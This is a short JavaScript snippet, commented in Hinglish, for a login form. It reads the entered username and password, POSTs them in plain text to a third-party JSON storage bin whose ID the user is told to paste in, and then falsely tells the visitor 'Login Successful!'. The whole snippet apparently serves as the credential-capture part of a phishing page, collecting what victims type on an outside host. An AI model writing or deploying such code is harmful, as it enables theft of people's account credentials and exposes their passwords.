function saveData() {
    let username = document.getElementById("username").value;
    let password = document.getElementById("password").value;

    fetch("https://json.extendsclass.com/bin/YOUR_UNIQUE_ID", {  // Apna JSONStorage API link yaha paste karo
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({ username, password })
    })
    .then(response => response.json())
    .then(data => {
        alert("Login Successful! Data saved.");
    })
    .catch(error => console.error("Error:", error));
}
